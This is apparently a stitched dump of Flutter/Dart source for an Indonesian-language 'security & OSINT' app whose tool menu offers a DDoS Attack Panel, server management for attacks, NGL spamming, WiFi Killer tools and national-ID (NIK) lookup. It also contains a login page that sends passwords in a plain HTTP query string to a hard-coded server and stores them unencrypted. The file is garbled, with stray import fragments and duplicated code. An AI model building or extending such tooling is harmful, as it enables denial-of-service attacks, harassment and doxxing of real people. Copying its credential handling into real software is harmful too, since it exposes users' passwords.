    final color = widget.selected ? _C.green : _C.textSub;
    return GestureDetector(
      onTapDown: (_) => setState(() => _pressed = true),
      onTapUp: (_) { setState(() => _pressed = false); widget.onTap(); },
      onTapCancel: () => setState(() => _pressed = false),
      child: AnimatedScale(
        scale: _pressed ? 0.96 : 1.0,
        duration: const Duration(milliseconds: 120),
        child: AnimatedContainer(
          duration: const Duration(milliseconds: 200),
          padding: const EdgeInsets.symmetric(vertical: 14, horizontal: 12),
          decoration: BoxDecoration(
            color: widget.selected ? _C.green.withOpacity(0.08) : _C.surface,
            borderRadius: BorderRadius.circular(14),
            border: Border.all(
              color: widget.selected ? _C.green.withOpacity(0.4) : _C.border,
              width: widget.selected ? 1.5 : 1,
            ),
          ),
          child: Column(mainAxisSize: MainAxisSize.min, children: [
            Stack(clipBehavior: Clip.none, children: [
              Icon(widget.icon, color: color, size: 20),
              if (widget.locked)
                Positioned(right: -4, top: -4,
                  child: Container(width: 12, height: 12,
                    decoration: BoxDecoration(shape: BoxShape.circle, color: _C.amber,
                        border: Border.all(color: _C.card, width: 1.5)),
                    child: const Icon(Icons.lock_rounded, color: Colors.white, size: 7))),
            ]),
            const SizedBox(height: 8),
            Text(widget.label, style: TextStyle(color: color, fontSize: 13, fontWeight: FontWeight.w700)),
            const SizedBox(height: 3),
            Text(widget.sublabel, textAlign: TextAlign.center,
                style: const TextStyle(color: _C.textDim, fontSize: 10, height: 1.3)),
            if (widget.selected) ...[
              const SizedBox(height: 6),
              Container(width: 20, height: 3,
                  decoration: BoxDecoration(color: _C.green, borderRadius: BorderRadius.circular(2))),
            ],
          ]),
        ),
      ),
    );
  }
}

class _WavePainter extends CustomPainter {
  final double t;
  _WavePainter(this.t);

  @override
  void paint(Canvas canvas, Size size) {
    final paint = Paint()..color = Colors.white.withOpacity(0.06)..style = PaintingStyle.fill;
    final path = Path();
    path.moveTo(0, size.height);
    for (double x = 0; x <= size.width; x++) {
      final y = size.height * 0.5 +
          math.sin((x / size.width * 4 * math.pi) + (t * math.pi * 2)) * size.height * 0.15;
      path.lineTo(x, y);
    }
    path.lineTo(size.width, size.height);
    path.close();
    canvas.drawPath(path, paint);
  }

  @override
  bool shouldRepaint(_WavePainter old) => old.t != t;
}

class _DotsLoader extends StatefulWidget {
  const _DotsLoader();

  @override
  State<_DotsLoader> createState() => _DotsLoaderState();
}

class _DotsLoaderState extends State<_DotsLoader> with SingleTickerProviderStateMixin {
  late AnimationController _c;

  @override
  void initState() {
    super.initState();
    _c = AnimationController(vsync: this, duration: const Duration(milliseconds: 900))..repeat();
  }

  @override
  void dispose() { _c.dispose(); super.dispose(); }

  @override
  Widget build(BuildContext context) {
    return AnimatedBuilder(
      animation: _c,
      builder: (_, __) => Row(
        mainAxisSize: MainAxisSize.min,
        children: List.generate(3, (i) {
          final t = ((_c.value - i / 3) % 1.0).clamp(0.0, 1.0);
          final s = math.sin(t * math.pi);
          return Padding(
            padding: const EdgeInsets.symmetric(horizontal: 4),
            child: Transform.scale(
              scale: 0.4 + s * 0.6,
              child: Container(width: 8, height: 8,
                decoration: BoxDecoration(shape: BoxShape.circle,
                    color: _C.redMid.withOpacity(0.4 + s * 0.6))),
            ),
          );
        }),
      ),
    );
  }
}

class _AnimatedBg extends StatelessWidget {
  final AnimationController controller;
  const _AnimatedBg({required this.controller});

  @override
  Widget build(BuildContext context) {
    return AnimatedBuilder(
      animation: controller,
      builder: (_, __) => CustomPaint(painter: _BgPainter(controller.value)),
    );
  }
}

class _BgPainter extends CustomPainter {
  final double t;
  _BgPainter(this.t);

  @override
  void paint(Canvas canvas, Size size) {
    final grid = Paint()..color = _C.border.withOpacity(0.22)..strokeWidth = 0.5;
    const step = 38.0;
    for (double x = 0; x < size.width; x += step)
      canvas.drawLine(Offset(x, 0), Offset(x, size.height), grid);
    for (double y = 0; y < size.height; y += step)
      canvas.drawLine(Offset(0, y), Offset(size.width, y), grid);
    final glow = Paint()
      ..shader = RadialGradient(colors: [
        _C.red.withOpacity(0.10 + math.sin(t * math.pi * 2) * 0.03),
        Colors.transparent,
      ], radius: 0.9).createShader(
          Rect.fromCircle(center: Offset(size.width / 2, 0), radius: size.width));
    canvas.drawCircle(Offset(size.width / 2, 0), size.width, glow);
  }

  @override
  bool shouldRepaint(_BgPainter old) => old.t != t;
}

class _GradBtn extends StatefulWidget {
  final String label; final VoidCallback onTap; final bool fullWidth;
  const _GradBtn({required this.label, required this.onTap, this.fullWidth = false});

  @override
  State<_GradBtn> createState() => _GradBtnState();
}

class _GradBtnState extends State<_GradBtn> {
  bool _down = false;

  @override
  Widget build(BuildContext context) {
    return GestureDetector(
      onTapDown: (_) => setState(() => _down = true),
      onTapUp: (_) { setState(() => _down = false); widget.onTap(); },
      onTapCancel: () => setState(() => _down = false),
      child: AnimatedScale(
        scale: _down ? 0.96 : 1.0,
        duration: const Duration(milliseconds: 120),
        child: Container(
          height: 46,
          width: widget.fullWidth ? double.infinity : null,
          decoration: BoxDecoration(
            gradient: _C.btnGrad,
            borderRadius: BorderRadius.circular(13),
            boxShadow: _down ? [] : [
              BoxShadow(color: _C.redMid.withOpacity(0.3), blurRadius: 14, offset: const Offset(0, 4))],
          ),
          child: Center(child: Text(widget.label,
              style: const TextStyle(color: Colors.white, fontWeight: FontWeight.w700, fontSize: 14))),
        ),
      ),
    );
  }
}














class ToolsPage extends StatelessWidget {
  final String sessionKey;
  final String userRole;
  final List<Map<String, dynamic>> listDoos;

  const ToolsPage({
    super.key,
    required this.sessionKey,
    required this.userRole,
    required this.listDoos,
  });

  // --- Tema Merah (konsisten dengan dashboard_page & login_page) ---
  final Color primaryDark = const Color(0xFF060B14);
  final Color primaryRed = const Color(0xFFBD1B1B);
  final Color accentRed = const Color(0xFFE82D2D);
  final Color lightRed = const Color(0xFFF55656);
  final Color primaryWhite = const Color(0xFFE2EDF9);
  final Color accentGrey = const Color(0xFF7A9BBF);
  final Color cardDark = const Color(0xFF101A2E);
  final Color borderDark = const Color(0xFF1A2D4A);

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: primaryDark,
      body: SafeArea(
        child: Column(
          children: [
            // === HEADER ===
            Container(
              width: double.infinity,
              padding: const EdgeInsets.all(24),
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  begin: Alignment.topLeft,
                  end: Alignment.bottomRight,
                  colors: [
                    primaryRed.withOpacity(0.3),
                    accentRed.withOpacity(0.2),
                    primaryRed.withOpacity(0.3),
                  ],
                ),
                borderRadius: const BorderRadius.only(
                  bottomLeft: Radius.circular(30),
                  bottomRight: Radius.circular(30),
                ),
                border: Border.all(color: primaryRed.withOpacity(0.3)),
                boxShadow: [
                  BoxShadow(
                    color: primaryRed.withOpacity(0.2),
                    blurRadius: 15,
                    spreadRadius: 2,
                  ),
                ],
              ),
              child: Column(
                children: [
                  Row(
                    mainAxisAlignment: MainAxisAlignment.center,
                    children: [
                      Icon(Icons.build_circle_outlined,
                          color: primaryWhite, size: 28),
                      const SizedBox(width: 12),
                      Text(
                        "TOOLS DASHBOARD",
                        style: TextStyle(
                          color: primaryWhite,
                          fontSize: 20,
                          fontFamily: 'Orbitron',
                          fontWeight: FontWeight.bold,
                          letterSpacing: 1.5,
                          shadows: [
                            Shadow(
                              color: primaryRed.withOpacity(0.8),
                              blurRadius: 10,
                            ),
                          ],
                        ),
                      ),
                    ],
                  ),
                  const SizedBox(height: 8),
                  Text(
                    "Advanced Security & OSINT Tools",
                    style: TextStyle(
                      color: lightRed,
                      fontSize: 14,
                      fontFamily: 'ShareTechMono',
                    ),
                  ),
                ],
              ),
            ),

            // === CATEGORY CARDS ===
            Expanded(
              child: Padding(
                padding: const EdgeInsets.all(16),
                child: GridView.count(
                  crossAxisCount: 2,
                  crossAxisSpacing: 16,
                  mainAxisSpacing: 16,
                  childAspectRatio: 1.2,
                  children: [
                    // DDoS Tools
                    _buildToolCard(
                      icon: Icons.flash_on,
                      title: "DDoS Tools",
                      subtitle: "Attack & Server",
                      color: primaryWhite,
                      gradient: [
                        primaryRed.withOpacity(0.3),
                        accentRed.withOpacity(0.2),
                      ],
                      onTap: () => _showDDoSTools(context),
                    ),

                    // Network Tools
                    _buildToolCard(
                      icon: Icons.wifi,
                      title: "Network",
                      subtitle: "WiFi & Spam",
                      color: primaryWhite,
                      gradient: [
                        primaryRed.withOpacity(0.3),
                        accentRed.withOpacity(0.2),
                      ],
                      onTap: () => _showNetworkTools(context),
                    ),

                    // OSINT Tools
                    _buildToolCard(
                      icon: Icons.search,
                      title: "OSINT",
                      subtitle: "Investigation",
                      color: primaryWhite,
                      gradient: [
                        primaryRed.withOpacity(0.3),
                        accentRed.withOpacity(0.2),
                      ],
                      onTap: () => _showOSINTTools(context),
                    ),

                    // Media Downloader
                    _buildToolCard(
                      icon: Icons.download,
                      title: "Downloader",
                      subtitle: "Social Media",
                      color: primaryWhite,
                      gradient: [
                        primaryRed.withOpacity(0.3),
                        accentRed.withOpacity(0.2),
                      ],
                      onTap: () => _showDownloaderTools(context),
                    ),

                    // Additional Tools
                    _buildToolCard(
                      icon: Icons.build,
                      title: "Utilities",
                      subtitle: "Extra Tools",
                      color: primaryWhite,
                      gradient: [
                        primaryRed.withOpacity(0.3),
                        accentRed.withOpacity(0.2),
                      ],
                      onTap: () => _showUtilityTools(context),
                    ),

                    // Quick Access
                    _buildToolCard(
                      icon: Icons.rocket_launch,
                      title: "Quick Access",
                      subtitle: "Favorites",
                      color: primaryWhite,
                      gradient: [
                        primaryRed.withOpacity(0.3),
                        accentRed.withOpacity(0.2),
                      ],
                      onTap: () => _showQuickAccess(context),
                    ),
                  ],
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildToolCard({
    required IconData icon,
    required String title,
    required String subtitle,
    required Color color,
    required List<Color> gradient,
    required VoidCallback onTap,
  }) {
    return TweenAnimationBuilder(
      tween: Tween<double>(begin: 0, end: 1),
      duration: const Duration(milliseconds: 600),
      curve: Curves.easeOutBack,
      builder: (context, double scale, child) {
        return Transform.scale(
          scale: scale,
          child: child,
        );
      },
      child: GestureDetector(
        onTap: onTap,
        child: Container(
          decoration: BoxDecoration(
            color: cardDark,
            borderRadius: BorderRadius.circular(20),
            border: Border.all(color: primaryRed.withOpacity(0.4), width: 1),
            boxShadow: [
              BoxShadow(
                color: primaryRed.withOpacity(0.2),
                blurRadius: 8,
                offset: const Offset(0, 2),
              ),
            ],
          ),
          child: Padding(
            padding: const EdgeInsets.all(20),
            child: Column(
              mainAxisAlignment: MainAxisAlignment.center,
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Container(
                  padding: const EdgeInsets.all(12),
                  decoration: BoxDecoration(
                    gradient: LinearGradient(
                      colors: [primaryRed, accentRed],
                      begin: Alignment.topLeft,
                      end: Alignment.bottomRight,
                    ),
                    shape: BoxShape.circle,
                    border: Border.all(color: lightRed.withOpacity(0.3)),
                    boxShadow: [
                      BoxShadow(
                        color: primaryRed.withOpacity(0.3),
                        blurRadius: 6,
                        offset: const Offset(0, 2),
                      ),
                    ],
                  ),
                  child: Icon(icon, color: primaryWhite, size: 24),
                ),
                const SizedBox(height: 10),
                Text(
                  title,
                  style: TextStyle(
                    color: primaryWhite,
                    fontSize: 13,
                    fontFamily: 'Orbitron',
                    fontWeight: FontWeight.bold,
                  ),
                ),
                const SizedBox(height: 2),
                Text(
                  subtitle,
                  style: TextStyle(
                    color: lightRed,
                    fontSize: 12,
                    fontFamily: 'ShareTechMono',
                  ),
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }

  void _showDDoSTools(BuildContext context) {
    showModalBottomSheet(
      context: context,
      backgroundColor: Colors.transparent,
      isScrollControlled: true,
      builder: (context) => Container(
        height: MediaQuery.of(context).size.height * 0.7,
        decoration: BoxDecoration(
          color: cardDark,
          borderRadius: const BorderRadius.only(
            topLeft: Radius.circular(30),
            topRight: Radius.circular(30),
          ),
          border: Border.all(color: primaryRed.withOpacity(0.3)),
          boxShadow: [
            BoxShadow(
              color: primaryRed.withOpacity(0.2),
              blurRadius: 20,
              spreadRadius: 5,
            ),
          ],
        ),
        child: Column(
          children: [
            Container(
              padding: const EdgeInsets.all(20),
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  colors: [primaryRed, accentRed],
                  begin: Alignment.centerLeft,
                  end: Alignment.centerRight,
                ),
                borderRadius: const BorderRadius.only(
                  topLeft: Radius.circular(30),
                  topRight: Radius.circular(30),
                ),
              ),
              child: Row(
                children: [
                  Icon(Icons.flash_on, color: primaryWhite),
                  const SizedBox(width: 12),
                  Text(
                    "DDoS Tools",
                    style: TextStyle(
                      color: primaryWhite,
                      fontSize: 20,
                      fontFamily: 'Orbitron',
                      fontWeight: FontWeight.bold,
                    ),
                  ),
                ],
              ),
            ),
            Expanded(
              child: Padding(
                padding: const EdgeInsets.all(16),
                child: Column(
                  children: [
                    _buildToolOption(
                      icon: Icons.flash_on,
                      label: "Attack Panel",
                      color: lightRed,
                      onTap: () {
                        Navigator.pop(context);
                        Navigator.push(
                          context,
                          MaterialPageRoute(
                            builder: (_) => AttackPanel(
                              sessionKey: sessionKey,
                              listDoos: listDoos,
                            ),
                          ),
                        );
                      },
                    ),
                    _buildToolOption(
                      icon: Icons.dns,
                      label: "Manage Server",
                      color: lightRed,
                      onTap: () {
                        Navigator.pop(context);
                        Navigator.push(
                          context,
                          MaterialPageRoute(
                            builder: (_) => ManageServerPage(keyToken: sessionKey),
                          ),
                        );
                      },
                    ),
                  ],
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  void _showNetworkTools(BuildContext context) {
    showModalBottomSheet(
      context: context,
      backgroundColor: Colors.transparent,
      isScrollControlled: true,
      builder: (context) => Container(
        height: MediaQuery.of(context).size.height * 0.7,
        decoration: BoxDecoration(
          color: cardDark,
          borderRadius: const BorderRadius.only(
            topLeft: Radius.circular(30),
            topRight: Radius.circular(30),
          ),
          border: Border.all(color: primaryRed.withOpacity(0.3)),
          boxShadow: [
            BoxShadow(
              color: primaryRed.withOpacity(0.2),
              blurRadius: 20,
              spreadRadius: 5,
            ),
          ],
        ),
        child: Column(
          children: [
            Container(
              padding: const EdgeInsets.all(20),
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  colors: [primaryRed, accentRed],
                  begin: Alignment.centerLeft,
                  end: Alignment.centerRight,
                ),
                borderRadius: const BorderRadius.only(
                  topLeft: Radius.circular(30),
                  topRight: Radius.circular(30),
                ),
              ),
              child: Row(
                children: [
                  Icon(Icons.wifi, color: primaryWhite),
                  const SizedBox(width: 12),
                  Text(
                    "Network Tools",
                    style: TextStyle(
                      color: primaryWhite,
                      fontSize: 20,
                      fontFamily: 'Orbitron',
                      fontWeight: FontWeight.bold,
                    ),
                  ),
                ],
              ),
            ),
            Expanded(
              child: Padding(
                padding: const EdgeInsets.all(16),
                child: Column(
                  children: [
                    _buildToolOption(
                      icon: Icons.newspaper_outlined,
                      label: "Spam NGL",
                      color: lightRed,
                      onTap: () {
                        Navigator.pop(context);
                        Navigator.push(
                          context,
                          MaterialPageRoute(builder: (_) => NglPage()),
                        );
                      },
                    ),
                    _buildToolOption(
                      icon: Icons.wifi_off,
                      label: "WiFi Killer (Internal)",
                      color: lightRed,
                      onTap: () {
                        Navigator.pop(context);
                        Navigator.push(
                          context,
                          MaterialPageRoute(builder: (_) => WifiKillerPage()),
                        );
                      },
                    ),
                    if (userRole == "vip" || userRole == "owner")
                      _buildToolOption(
                        icon: Icons.router,
                        label: "WiFi Killer (External)",
                        color: lightRed,
                        onTap: () {
                          Navigator.pop(context);
                          Navigator.push(
                            context,
                            MaterialPageRoute(
                              builder: (_) => WifiInternalPage(sessionKey: sessionKey),
                            ),
                          );
                        },
                      ),
                  ],
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  void _showOSINTTools(BuildContext context) {
    showModalBottomSheet(
      context: context,
      backgroundColor: Colors.transparent,
      isScrollControlled: true,
      builder: (context) => Container(
        height: MediaQuery.of(context).size.height * 0.7,
        decoration: BoxDecoration(
          color: cardDark,
          borderRadius: const BorderRadius.only(
            topLeft: Radius.circular(30),
            topRight: Radius.circular(30),
          ),
          border: Border.all(color: primaryRed.withOpacity(0.3)),
          boxShadow: [
            BoxShadow(
              color: primaryRed.withOpacity(0.2),
              blurRadius: 20,
              spreadRadius: 5,
            ),
          ],
        ),
        child: Column(
          children: [
            Container(
              padding: const EdgeInsets.all(20),
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  colors: [primaryRed, accentRed],
                  begin: Alignment.centerLeft,
                  end: Alignment.centerRight,
                ),
                borderRadius: const BorderRadius.only(
                  topLeft: Radius.circular(30),
                  topRight: Radius.circular(30),
                ),
              ),
              child: Row(
                children: [
                  Icon(Icons.search, color: primaryWhite),
                  const SizedBox(width: 12),
                  Text(
                    "OSINT Tools",
                    style: TextStyle(
                      color: primaryWhite,
                      fontSize: 20,
                      fontFamily: 'Orbitron',
                      fontWeight: FontWeight.bold,
                    ),
                  ),
                ],
              ),
            ),
            Expanded(
              child: Padding(
                padding: const EdgeInsets.all(16),
                child: Column(
                  children: [
                    _buildToolOption(
                      icon: Icons.badge,
                      label: "NIK Detail",
                      color: lightRed,
                      onTap: () {
                        Navigator.pop(context);
                        Navigator.push(
                          context,
                          MaterialPageRoute(builder: (_) => const NikCheckerPage()),
                        );
                      },
                    ),
                    _buildToolOption(
                      icon: Icons.domain,
                      label: "Domain OSINT",
                      color: lightRed,
                      onTap: () {
                        Navigator.pop(context);
                        Navigator.push(
                          context,
                          MaterialPageRoute(builder: (_) => const DomainOsintPage()),
                        );
                      },
                    ),
                    _buildToolOption(
                      icon: Icons.person_search,
                      label: "Phone Lookup",
                      color: lightRed,
                      onTap: () => _showComingSoon(context),
                    ),
                    _buildToolOption(
                      icon: Icons.email,
                      label: "Email OSINT",
                      color: lightRed,
                      onTap: () => _showComingSoon(context),
                    ),
                  ],
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  void _showDownloaderTools(BuildContext context) {
    showModalBottomSheet(
      context: context,
      backgroundColor: Colors.transparent,
      isScrollControlled: true,
      builder: (context) => Container(
        height: MediaQuery.of(context).size.height * 0.6,
        decoration: BoxDecoration(
          color: cardDark,
          borderRadius: const BorderRadius.only(
            topLeft: Radius.circular(30),
            topRight: Radius.circular(30),
          ),
          border: Border.all(color: primaryRed.withOpacity(0.3)),
          boxShadow: [
            BoxShadow(
              color: primaryRed.withOpacity(0.2),
              blurRadius: 20,
              spreadRadius: 5,
            ),
          ],
        ),
        child: Column(
          children: [
            Container(
              padding: const EdgeInsets.all(20),
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  colors: [primaryRed, accentRed],
                  begin: Alignment.centerLeft,
                  end: Alignment.centerRight,
                ),
                borderRadius: const BorderRadius.only(
                  topLeft: Radius.circular(30),
                  topRight: Radius.circular(30),
                ),
              ),
              child: Row(
                children: [
                  Icon(Icons.download, color: primaryWhite),
                  const SizedBox(width: 12),
                  Text(
                    "Media Downloader",
                    style: TextStyle(
                      color: primaryWhite,
                      fontSize: 20,
                      fontFamily: 'Orbitron',
                      fontWeight: FontWeight.bold,
                    ),
                  ),
                ],
              ),
            ),
            Expanded(
              child: Padding(
                padding: const EdgeInsets.all(16),
                child: Column(
                  children: [
                    _buildToolOption(
                      icon: Icons.video_library,
                      label: "TikTok Downloader",
                      color: lightRed,
                      onTap: () {
                        Navigator.pop(context);
                        Navigator.push(
                          context,
                          MaterialPageRoute(builder: (_) => const TiktokDownloaderPage()),
                        );
                      },
                    ),
                    _buildToolOption(
                      icon: Icons.camera_alt,
                      label: "Instagram Downloader",
                      color: lightRed,
                      onTap: () {
                        Navigator.pop(context);
                        Navigator.push(
                          context,
                          MaterialPageRoute(builder: (_) => const InstagramDownloaderPage()),
                        );
                      },
                    ),
                  ],
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  void _showUtilityTools(BuildContext context) {
    showModalBottomSheet(
      context: context,
      backgroundColor: Colors.transparent,
      isScrollControlled: true,
      builder: (context) => Container(
        height: MediaQuery.of(context).size.height * 0.6,
        decoration: BoxDecoration(
          color: cardDark,
          borderRadius: const BorderRadius.only(
            topLeft: Radius.circular(30),
            topRight: Radius.circular(30),
          ),
          border: Border.all(color: primaryRed.withOpacity(0.3)),
          boxShadow: [
            BoxShadow(
              color: primaryRed.withOpacity(0.2),
              blurRadius: 20,
              spreadRadius: 5,
            ),
          ],
        ),
        child: Column(
          children: [
            Container(
              padding: const EdgeInsets.all(20),
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  colors: [primaryRed, accentRed],
                  begin: Alignment.centerLeft,
                  end: Alignment.centerRight,
                ),
                borderRadius: const BorderRadius.only(
                  topLeft: Radius.circular(30),
                  topRight: Radius.circular(30),
                ),
              ),
              child: Row(
                children: [
                  Icon(Icons.build, color: primaryWhite),
                  const SizedBox(width: 12),
                  Text(
                    "Utility Tools",
                    style: TextStyle(
                      color: primaryWhite,
                      fontSize: 20,
                      fontFamily: 'Orbitron',
                      fontWeight: FontWeight.bold,
                    ),
                  ),
                ],
              ),
            ),
            Expanded(
              child: Padding(
                padding: const EdgeInsets.all(16),
                child: Column(
                  children: [
                    _buildToolOption(
                      icon: Icons.qr_code,
                      label: "QR Generator",
                      color: lightRed,
                      onTap: () {
                        Navigator.pop(context);
                        Navigator.push(
                          context,
                          MaterialPageRoute(builder: (_) => const QrGeneratorPage()),
                        );
                      },
                    ),
                    _buildToolOption(
                      icon: Icons.security,
                      label: "IP Scanner",
                      color: lightRed,
                      onTap: () => _showComingSoon(context),
                    ),
                    _buildToolOption(
                      icon: Icons.network_check,
                      label: "Port Scanner",
                      color: lightRed,
                      onTap: () => _showComingSoon(context),
                    ),
                  ],
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  void _showQuickAccess(BuildContext context) {
    _showComingSoon(context);
  }

  Widget _buildToolOption({
    required IconData icon,
    required String label,
    required Color color,
    required VoidCallback onTap,
  }) {
    return Card(
      color: const Color(0xFF0C1424),
      margin: const EdgeInsets.symmetric(vertical: 8),
      shape: RoundedRectangleBorder(
        borderRadius: BorderRadius.circular(15),
        side: BorderSide(color: primaryRed.withOpacity(0.3)),
      ),
      elevation: 4,
      shadowColor: primaryRed.withOpacity(0.2),
      child: ListTile(
        leading: Container(
          padding: const EdgeInsets.all(8),
          decoration: BoxDecoration(
            color: primaryRed.withOpacity(0.2),
            shape: BoxShape.circle,
            border: Border.all(color: primaryRed.withOpacity(0.3)),
          ),
          child: Icon(icon, color: color),
        ),
        title: Text(
          label,
          style: TextStyle(
            color: primaryWhite,
            fontFamily: 'Orbitron',
            fontWeight: FontWeight.w500,
          ),
        ),
        trailing: Container(
          padding: const EdgeInsets.all(4),
          decoration: BoxDecoration(
            color: primaryRed.withOpacity(0.2),
            shape: BoxShape.circle,
          ),
          child: Icon(Icons.arrow_forward_ios, color: color, size: 14),
        ),
        onTap: onTap,
      ),
    );
  }

  void _showComingSoon(BuildContext context) {
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Row(
          children: [
            Icon(Icons.hourglass_top, color: primaryWhite),
            const SizedBox(width: 8),
            Text(
              'Feature Coming Soon!',
              style: TextStyle(
                fontFamily: 'Orbitron',
                fontWeight: FontWeight.bold,
                color: primaryWhite,
              ),
            ),
          ],
        ),
        backgroundColor: primaryRed,
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(10),
        ),
        duration: const Duration(seconds: 2),
      ),
    );
  }
}


as math;

as http;





const String baseUrl = 'http://papi.queen-official.com:2836';

// ─── Palette: Merah Monokromatik ─────────────────────────────────────────────
class _C {
  static const bg         = Color(0xFF00FF00);  // lebih hijau
  static const surface    = Color(0xFF150A0A);
  static const card       = Color(0xFF250E0E);
  static const border     = Color(0xFF4A1616);
  static const borderLit  = Color(0xFF6E1E1E);

  // SEMUA WARNA BIRU DIUBAH MENJADI MERAH
  static const steel      = Color(0xFF8B0000);  // dark red
  static const blueMid    = Color(0xFFDC2626);  // red mid
  static const blueLight  = Color(0xFFEF4444);  // red light
  static const chrome     = Color(0xFFB91C1C);  // red chrome
  static const frost      = Color(0xFFF87171);  // red frost

  static const green      = Color(0xFF22C55E);
  static const amber      = Color(0xFFF59E0B);
  static const red        = Color(0xFFEF4444);

  static const text       = Color(0xFFFEEEEE);
  static const textSub    = Color(0xFFB86A6A);
  static const textDim    = Color(0xFF6E2E2E);

  // Gradien diubah menjadi merah ke abu-abu gelap
  static const LinearGradient metalGrad = LinearGradient(
    colors: [Color(0xFF8B0000), Color(0xFFDC2626), Color(0xFFF87171)],
    begin: Alignment.topLeft,
    end: Alignment.bottomRight,
  );
}

class LoginPage extends StatefulWidget {
  const LoginPage({super.key});

  @override
  State<LoginPage> createState() => _LoginPageState();
}

class _LoginPageState extends State<LoginPage>
    with TickerProviderStateMixin {
  final userCtrl    = TextEditingController();
  final passCtrl    = TextEditingController();
  final _formKey    = GlobalKey<FormState>();

  bool _isLoading       = false;
  bool _obscurePass     = true;
  String? _androidId;

  // Animations
  late AnimationController _bgCtrl;
  late AnimationController _entranceCtrl;
  late AnimationController _logoCtrl;
  late AnimationController _btnCtrl;
  late AnimationController _shakeCtrl;

  late Animation<double> _fade;
  late Animation<Offset>  _slide;
  late Animation<double>  _logoGlow;
  late Animation<double>  _btnPulse;
  late Animation<double>  _shake;

  @override
  void initState() {
    super.initState();

    _bgCtrl = AnimationController(
        vsync: this, duration: const Duration(seconds: 18))
      ..repeat();

    _entranceCtrl = AnimationController(
        vsync: this, duration: const Duration(milliseconds: 1000));
    _fade  = CurvedAnimation(parent: _entranceCtrl, curve: Curves.easeOut);
    _slide = Tween<Offset>(begin: const Offset(0, 0.06), end: Offset.zero)
        .animate(CurvedAnimation(
            parent: _entranceCtrl, curve: Curves.easeOutCubic));

    _logoCtrl = AnimationController(
        vsync: this, duration: const Duration(milliseconds: 2200))
      ..repeat(reverse: true);
    _logoGlow = Tween<double>(begin: 0.3, end: 0.85)
        .animate(CurvedAnimation(parent: _logoCtrl, curve: Curves.easeInOut));

    _btnCtrl = AnimationController(
        vsync: this, duration: const Duration(milliseconds: 1600))
      ..repeat(reverse: true);
    _btnPulse = Tween<double>(begin: 1.0, end: 1.03)
        .animate(CurvedAnimation(parent: _btnCtrl, curve: Curves.easeInOut));

    _shakeCtrl = AnimationController(
        vsync: this, duration: const Duration(milliseconds: 500));
    _shake = TweenSequence<double>([
      TweenSequenceItem(tween: Tween(begin: 0.0, end: -10.0), weight: 1),
      TweenSequenceItem(tween: Tween(begin: -10.0, end: 10.0), weight: 2),
      TweenSequenceItem(tween: Tween(begin: 10.0, end: -7.0),  weight: 2),
      TweenSequenceItem(tween: Tween(begin: -7.0, end: 7.0),   weight: 2),
      TweenSequenceItem(tween: Tween(begin: 7.0, end: 0.0),    weight: 1),
    ]).animate(CurvedAnimation(parent: _shakeCtrl, curve: Curves.easeInOut));

    _entranceCtrl.forward();
    _initLogin();
  }

  @override
  void dispose() {
    _bgCtrl.dispose();
    _entranceCtrl.dispose();
    _logoCtrl.dispose();
    _btnCtrl.dispose();
    _shakeCtrl.dispose();
    userCtrl.dispose();
    passCtrl.dispose();
    super.dispose();
  }

  // ─── Init auto-login ──────────────────────────────────────────────────────
  Future<void> _initLogin() async {
    final info = await DeviceInfoPlugin().androidInfo;
    _androidId = info.id;

    final prefs    = await SharedPreferences.getInstance();
    final savedUser = prefs.getString('username');
    final savedPass = prefs.getString('password');
    final savedKey  = prefs.getString('key');

    if (savedUser != null && savedPass != null && savedKey != null) {
      try {
        final res  = await http.get(Uri.parse(
            '$baseUrl/myInfo?username=$savedUser&password=$savedPass&androidId=$_androidId&key=$savedKey'));
        final data = jsonDecode(res.body);

        if (data['valid'] == true && mounted) {
          Navigator.pushReplacement(
            context,
            MaterialPageRoute(builder: (_) => SplashScreen(
              username: savedUser, password: savedPass,
              role: data['role'], sessionKey: data['key'],
              expiredDate: data['expiredDate'],
              listBug:  _parseList(data['listBug']),
              listDoos: _parseList(data['listDDoS']),
              news:     _parseList(data['news']),
            )),
          );
        }
      } catch (_) {}
    }
  }

  List<Map<String, dynamic>> _parseList(dynamic raw) =>
      (raw as List? ?? []).map((e) => Map<String, dynamic>.from(e as Map)).toList();

  // ─── Login ────────────────────────────────────────────────────────────────
  Future<void> _login() async {
    if (!_formKey.currentState!.validate()) return;

    final username = userCtrl.text.trim();
    final password = passCtrl.text.trim();

    setState(() => _isLoading = true);

    try {
      final res  = await http.post(Uri.parse('$baseUrl/validate'), body: {
        'username': username,
        'password': password,
        'androidId': _androidId ?? 'unknown',
      });
      final data = jsonDecode(res.body);

      if (data['expired'] == true) {
        _shakeCtrl.forward(from: 0);
        _showAlert(
          title:   'Akses Habis',
          message: 'Masa akses Anda telah berakhir. Silakan perpanjang.',
          type:    _AlertType.warning,
          showContact: true,
        );
      } else if (data['valid'] != true) {
        _shakeCtrl.forward(from: 0);
        final msg = (data['message'] ?? '').toString().toLowerCase();
        if (msg.contains('perangkat') || msg.contains('device') ||
            msg.contains('another')) {
          _showAlert(
            title:   'Sesi Aktif',
            message: 'Akun ini sedang login di perangkat lain.',
            type:    _AlertType.warning,
          );
        } else {
          _showAlert(
            title:   'Login Gagal',
            message: 'Username atau password salah.',
            type:    _AlertType.error,
          );
        }
      } else {
        final prefs = await SharedPreferences.getInstance();
        prefs.setString('username', username);
        prefs.setString('password', password);
        prefs.setString('key', data['key']);

        if (mounted) {
          Navigator.pushReplacement(
            context,
            MaterialPageRoute(builder: (_) => SplashScreen(
              username: username, password: password,
              role: data['role'], sessionKey: data['key'],
              expiredDate: data['expiredDate'],
              listBug:  _parseList(data['listBug']),
              listDoos: _parseList(data['listDDoS']),
